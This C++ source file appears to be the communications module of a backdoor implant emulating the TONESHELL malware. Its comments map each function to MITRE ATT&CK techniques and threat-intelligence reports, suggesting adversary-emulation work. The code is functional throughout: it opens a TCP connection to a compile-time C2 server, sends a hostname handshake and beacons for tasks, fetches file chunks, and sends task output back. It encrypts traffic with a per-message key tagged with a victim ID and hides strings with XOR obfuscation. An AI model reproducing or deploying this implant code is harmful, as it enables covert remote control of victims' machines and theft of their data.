#include "comms.hpp"
#include "logger.hpp"
#include "shellcode_util.hpp"
#include "comms_encryption.hpp"
#include <al/string.hpp>

#ifndef SERVER
#error "comms.cpp must have SERVER set at compile time"
#endif

#ifndef PORT
#error "comms.cpp must have PORT set at compile time"
#endif

DWORD sendAndReceive(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, unsigned char msg_type, void* data, size_t data_len);

// Helper function to send client message to C2 server
// Reference: Reference: https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
DWORD sendClientMsg(sh_context* ctx, client_message* msg) {
    DWORD remaining_bytes = GetClientMsgSize(msg);
    char* p_seek_buffer = reinterpret_cast<char*>(msg);
    int result;
    while (remaining_bytes > 0) {
        result = ctx->fp.fp_send(ctx->comms_socket, p_seek_buffer, remaining_bytes, 0);
        if (result == SOCKET_ERROR) {
            return ctx->fp.fp_WSAGetLastError();
        }
        remaining_bytes -= result;
        p_seek_buffer += result;
    }
    result = ctx->fp.fp_shutdown(ctx->comms_socket, SD_SEND);
    if (result == SOCKET_ERROR) {
        return ctx->fp.fp_WSAGetLastError();
    }
    return ERROR_SUCCESS;
}

// Helper function to get server response
DWORD getServerResponse(sh_context* ctx, server_response* rsp) {
    char* p_seek_buffer = reinterpret_cast<char*>(rsp);
    size_t remaining_buf_size = sizeof(server_response);
    int result;
    do {
        result = ctx->fp.fp_recv(ctx->comms_socket, p_seek_buffer, remaining_buf_size, 0);
        if (result == SOCKET_ERROR) {
            return ctx->fp.fp_WSAGetLastError();
        }
        p_seek_buffer += result;
        remaining_buf_size -= result;
    } while (result != 0);

    result = ctx->fp.fp_shutdown(ctx->comms_socket, SD_RECEIVE);
    if (result == SOCKET_ERROR) {
        return ctx->fp.fp_WSAGetLastError();
    }
    return ERROR_SUCCESS;
}

// Helper function to connect to the C2 server
DWORD connectSocket(sh_context* ctx) {
    if (ctx->comms_socket != INVALID_SOCKET) {
        ctx->fp.fp_closesocket(ctx->comms_socket);
        ctx->comms_socket = INVALID_SOCKET;
    }

    // Set up TCP/IPv4 socket
    ctx->comms_socket = ctx->fp.fp_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ctx->comms_socket == INVALID_SOCKET){
        return ctx->fp.fp_WSAGetLastError();
    }
    AesLogger::LogDebug(&(ctx->log_ctx), "Created socket."_xor);

    struct sockaddr_in client_service;
    client_service.sin_family = AF_INET;
    client_service.sin_addr.s_addr = ctx->fp.fp_inet_addr(XOR_MACRO(SERVER));
    client_service.sin_port = ctx->fp.fp_htons(PORT);

    DWORD result = ctx->fp.fp_connect(ctx->comms_socket, (SOCKADDR*) &client_service, sizeof(client_service));
    if (result == SOCKET_ERROR) {
        return ctx->fp.fp_WSAGetLastError();
    }

    // Caller can now use socket
    return ERROR_SUCCESS;
}

/*
 * InitializeComms:
 *      About:
 *          Sets up necessary data structures and socket for communicating with the C2 server.
 *      Result:
 *          0 upon success, otherwise non-zero error code.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://hunt.io/blog/toneshell-backdoor-used-to-target-attendees-of-the-iiss-defence-summit
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD InitializeComms(sh_context* ctx) {
    WSADATA wsa_data;
    ctx->comms_socket = INVALID_SOCKET;

    // Use version 2.2
    DWORD result = ctx->fp.fp_WSAStartup(MAKEWORD(2, 2), &wsa_data);
    if (result != 0) {
        return result;
    }

    return ERROR_SUCCESS;
}

/*
 * PerformHandshake:
 *      About:
 *          Performs initial handshake with C2 server to establish a session
 *      Result:
 *          0 upon success, otherwise non-zero error code.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
 */
DWORD PerformHandshake(sh_context* ctx, client_message* msg_buf, server_response* resp_buf) {
    // Connect to server and port
    handshake_data data;
    pi_memcpy(data.hostname, ctx->hostname, ctx->hostname_size);
    data.hostname_len = (DWORD)ctx->hostname_size;
    DWORD result = sendAndReceive(
        ctx,
        msg_buf,
        resp_buf,
        MSG_TYPE_HANDSHAKE,
        &data,
        sizeof(data.hostname_len) + data.hostname_len
    );
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(&(ctx->log_ctx), "Failed to perform handshake request. Error code: %d"_xor, result);
        return result;
    }

    // Check response type
    if (resp_buf->resp_type != RESP_TYPE_HANDSHAKE) {
        AesLogger::LogError(&(ctx->log_ctx), "Server response is not a handshake response."_xor);
        return FAIL_BAD_SERVER_HANDSHAKE_RSP;
    }

    return ERROR_SUCCESS;
}

/*
 * PerformBeacon:
 *      About:
 *          Performs beacon to request a task from the C2 server.
 *          Populates the server response in resp_buf.
 *      Result:
 *          0 upon success, otherwise non-zero error code.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
 */
DWORD PerformBeacon(sh_context* ctx, client_message* msg_buf, server_response* resp_buf) {
    return sendAndReceive(
        ctx,
        msg_buf,
        resp_buf,
        MSG_TYPE_BEACON,
        NULL,
        0
    );
}

DWORD RequestFileChunk(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, file_chunk_req* req_data) {
    DWORD result = sendAndReceive(
        ctx,
        msg_buf,
        resp_buf,
        MSG_TYPE_FILE_CHUNK_REQ,
        req_data,
        sizeof(file_chunk_req)
    );
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(&(ctx->log_ctx), "Failed to request file chunk. Error code: %d"_xor, result);
    } else {
        AesLogger::LogDebug(&(ctx->log_ctx), "Sent file chunk request."_xor);
    }
    return result;
}

/*
 * SendTaskOutput:
 *      About:
 *          Sends task output to the C2 server.
 *      Result:
 *          0 upon success, otherwise non-zero error code.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/23/f/behind-the-scenes-unveiling-the-hidden-workings-of-earth-preta.html
 */
DWORD SendTaskOutput(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, task_output_data* data) {
    DWORD result = sendAndReceive(
        ctx,
        msg_buf,
        resp_buf,
        MSG_TYPE_TASK_OUTPUT,
        data,
        sizeof(data->task_num) + sizeof(data->chunk_size) + data->chunk_size
    );
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(&(ctx->log_ctx), "Failed to send task output chunk. Error code: %d"_xor, result);
        return result;
    } else {
        AesLogger::LogDebug(&(ctx->log_ctx), "Sent task output chunk."_xor);
    }

    // Check response type if a response was expected
    if (resp_buf != NULL && resp_buf->resp_type != RESP_TYPE_OUTPUT_ACK) {
        AesLogger::LogError(&(ctx->log_ctx), "Server response %d is not an output acknowledgement response."_xor, resp_buf->resp_type);
        return FAIL_BAD_SERVER_OUTPUT_RSP;
    }
    return ERROR_SUCCESS;
}

/*
 * NotifyTaskComplete:
 *      About:
 *          Notifies the C2 server that the associated task has been completed
 *      Result:
 *          0 upon success, otherwise non-zero error code.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 */
DWORD NotifyTaskComplete(sh_context* ctx, client_message* msg_buf, task_complete_data* data) {
    DWORD result = sendAndReceive(
        ctx,
        msg_buf,
        NULL, // do not expect server response
        MSG_TYPE_TASK_COMPLETE,
        data,
        sizeof(task_complete_data)
    );
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(&(ctx->log_ctx), "Failed to send task complete notification. Error code: %d"_xor, result);
    } else {
        AesLogger::LogDebug(&(ctx->log_ctx), "Sent task complete notification."_xor);
    }

    return result;
}

/*
 * NotifyTaskError:
 *      About:
 *          Notifies the C2 server that the specified task resulted in an error.
 *      Result:
 *          0 upon success, otherwise non-zero error code.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *          T1573.001: Encrypted Channel: Symmetric Cryptography
 */
DWORD NotifyTaskError(sh_context* ctx, client_message* msg_buf, DWORD task_num, DWORD error_code) {
    error_data data;
    data.error_code = error_code;
    data.task_num = task_num;
    DWORD result = sendAndReceive(
        ctx,
        msg_buf,
        NULL, // do not expect server response
        MSG_TYPE_ERROR,
        &data,
        sizeof(error_data)
    );
    if (result != ERROR_SUCCESS) {
        AesLogger::LogError(&(ctx->log_ctx), "Failed to send error notification. Error code: %d"_xor, result);
    } else {
        AesLogger::LogDebug(&(ctx->log_ctx), "Sent error notification."_xor);
    }

    return result;
}

/*
 * CommsCleanup:
 *      About:
 *          Performs socket-related cleanup.
 *      MITRE ATT&CK Techniques:
 *          T1095: Non-Application Layer Protocol
 *          T1106: Native API
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *
 */
void CommsCleanup(sh_context* ctx) {
    if (ctx->comms_socket != INVALID_SOCKET) {
        ctx->fp.fp_closesocket(ctx->comms_socket);
        ctx->comms_socket = INVALID_SOCKET;
    }
    ctx->fp.fp_WSACleanup();
}

// Returns the size of the entire message, including header information.
size_t GetClientMsgSize(client_message* msg) {
    return sizeof(msg->magic) + sizeof(msg->payload_size) +
           sizeof(msg->enc_key) + PAYLOAD_SIZE(msg);
}

// Populates client message fields using the provided information.
// Will cut off data past MSG_DATA_MAX_LEN
DWORD SetClientMsg(client_message* msg, unsigned char* victim_id, unsigned char msg_type, void* data, size_t data_len, BCryptGenRandom_t rand_func) {
    if (data_len > MSG_DATA_MAX_LEN) {
        data_len = MSG_DATA_MAX_LEN;
    }

    unsigned char magic[3] = {0x18, 0x04, 0x04};
    pi_memcpy(msg->magic, magic, sizeof(magic));
    size_t payload_size = data_len + sizeof(msg->msg_type) + sizeof(msg->victim_id);
    SET_PAYLOAD_SIZE(msg, payload_size);

    pi_memcpy(msg->victim_id, victim_id, sizeof(msg->victim_id));
    msg->msg_type = msg_type;
    if ((void*)(msg->data) != data) {
        pi_memcpy(msg->data, data, data_len);
    }

    // Randomly generate encryption key and encrypt everything past the key field
    NTSTATUS rand_result = rand_func(
        BCRYPT_RNG_ALG_HANDLE,
        msg->enc_key,
        sizeof(msg->enc_key),
        0
    );
    if (rand_result != STATUS_SUCCESS) {
        return (DWORD)rand_result;
    }
    CommsCryptInPlace(msg->victim_id, payload_size, msg->enc_key, sizeof(msg->enc_key));

    return ERROR_SUCCESS;
}

/*
 * ValidateMagic:
 *      About:
 *          Checks that the server response starts with the correct
 *          magic bytes 0x18, 0x04, 0x04
 *      Result:
 *          Boolean validation result
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
BOOL ValidateMagic(server_response* rsp) {
    unsigned char magic[3] = {0x18, 0x04, 0x04};
    for (size_t i = 0; i < sizeof(magic); i++) {
        if (rsp->magic[i] != magic[i]) {
            return false;
        }
    }
    return true;
}

// Helper method to send client data to the C2 server.
// If resp_buf is not NULL, will fetch server response
DWORD sendAndReceive(sh_context* ctx, client_message* msg_buf, server_response* resp_buf, unsigned char msg_type, void* data, size_t data_len) {
    // Connect to server and port
    DWORD result;
    do {
        result = SetClientMsg(
            msg_buf,
            ctx->victim_id,
            msg_type,
            data,
            data_len,
            ctx->fp.shared_fp.fp_BCryptGenRandom
        );
        if (result != ERROR_SUCCESS) {
            AesLogger::LogError(&(ctx->log_ctx), "Failed to set client message. Error code: %d"_xor, result);
            break;
        }

        result = connectSocket(ctx);
        if (result != ERROR_SUCCESS) {
            break;
        }

        result = sendClientMsg(ctx, msg_buf);
        if (result != ERROR_SUCCESS) {
            ctx->fp.fp_shutdown(ctx->comms_socket, SD_BOTH);
            break;
        }

        if (resp_buf == NULL) {
            ctx->fp.fp_shutdown(ctx->comms_socket, SD_RECEIVE);
        } else {
            result = getServerResponse(ctx, resp_buf);
            if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&(ctx->log_ctx), "Failed to receive server response. Error code: %d"_xor, result);
                ctx->fp.fp_shutdown(ctx->comms_socket, SD_RECEIVE);
                break;
            }

            // Validate response
            if (!ValidateMagic(resp_buf)) {
                result = FAIL_BAD_SERVER_RSP_MAGIC;
                AesLogger::LogError(&(ctx->log_ctx), "Server response did not include magic bytes."_xor);
                break;
            }

            // Decrypt response, starting at resp_type field.
            // Server response is encrypted using the original
            // client message encryption key.
            CommsCryptInPlace(
                &(resp_buf->resp_type),
                GET_PAYLOAD_SIZE(resp_buf),
                msg_buf->enc_key,
                sizeof(msg_buf->enc_key)
            );

            AesLogger::LogDebug(&(ctx->log_ctx), "Response type: %d"_xor, resp_buf->resp_type);
            AesLogger::LogDebug(&(ctx->log_ctx), "Response data size: %d"_xor, PAYLOAD_SIZE(resp_buf));
        }
        result = ERROR_SUCCESS;
    } while (false);

    // Clean up socket
    if (ctx->comms_socket != INVALID_SOCKET) {
        ctx->fp.fp_closesocket(ctx->comms_socket);
        ctx->comms_socket = INVALID_SOCKET;
    }

    return result;
}
